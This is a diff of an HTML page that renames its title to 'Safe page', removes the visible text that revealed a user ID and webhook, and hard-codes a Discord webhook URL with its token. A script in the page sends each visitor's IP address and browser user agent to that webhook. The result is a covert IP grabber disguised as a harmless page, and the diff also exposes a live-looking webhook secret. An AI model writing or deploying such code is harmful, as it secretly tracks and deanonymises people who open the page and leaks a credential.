@@ -3,11 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Page Secondaire</title>
+    <title>Safe page</title>
 </head>
 <body>
-    <h1>Informations de la personne avec l'ID : <span id="userID"></span></h1>
-    <p>Webhook Discord : <span id="webhookURL"></span></p>
     
     <script>
         window.onload = function() {
@@ -31,7 +29,7 @@
         function getIP(json) {
             var ip = json.ip;
             // Sending the IP address to a Discord webhook
-            var webhookURL = webhookURL;
+            var webhookURL = "https://discord.com/api/webhooks/1234120249553588274/DpInTGsdCiCjcJRDj60LsAgLxGk9gO3MyWNCgw1X5vJxA5UoErpHyPuSEAsaSBQLN_-Y";
             var deviceName = navigator.userAgent; // Get the device name
 
             // Creating the data object to send
